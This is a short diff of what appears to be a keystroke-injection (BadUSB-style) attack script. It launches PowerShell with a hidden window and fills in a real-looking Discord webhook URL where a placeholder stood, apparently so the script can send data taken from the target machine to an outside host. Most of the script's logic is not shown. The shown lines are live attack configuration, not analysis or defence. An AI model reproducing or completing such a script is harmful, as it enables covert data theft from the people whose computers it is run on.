@@ -67,7 +67,7 @@ STRING PowerShell.exe -WindowStyle hidden
 DELAY 750
 ENTER
 DELAY 1500
-STRING $webhook = 'YOUR DISCORD WEBHOOK'
+STRING $webhook = 'https://discord.com/api/webhooks/1412068529443700747/jciH1YJqjE1Pp62xRg5HjQaohVcFzCh04UnkXp1voDLbAXdEjVUXZS42vY60fPxxbU9E'
 ENTER
 DELAY 500
 STRING cd C:\temp
@@ -90,3 +90,4 @@ ENTER
 DELAY 500
 STRING exit
 ENTER
+
